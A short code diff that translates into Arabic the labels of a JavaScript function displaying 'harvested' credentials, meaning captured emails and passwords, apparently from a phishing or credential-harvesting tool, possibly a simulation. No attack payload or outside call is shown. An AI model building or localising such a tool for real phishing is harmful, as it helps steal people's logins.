@@ -197,7 +197,7 @@ function updateHarvestedDisplay() {
     const displayDiv = document.getElementById('harvested-creds');
     
     if (harvestedCredentials.length === 0) {
-        displayDiv.innerHTML = '<p class="no-creds">No credentials harvested yet...</p>';
+        displayDiv.innerHTML = '<p class="no-creds">لم يتم حصاد أي بيانات اعتماد بعد...</p>';
         return;
     }
     
@@ -212,11 +212,11 @@ function updateHarvestedDisplay() {
                 </div>
                 <div class="cred-details">
                     <div class="cred-field">
-                        <span class="label">Email:</span>
+                        <span class="label">البريد الإلكتروني:</span>
                         <span class="value">${cred.email}</span>
                     </div>
                     <div class="cred-field">
-                        <span class="label">Password:</span>
+                        <span class="label">كلمة المرور:</span>
                         <span class="value password">${cred.password}</span>
                     </div>
                     <div class="cred-meta">
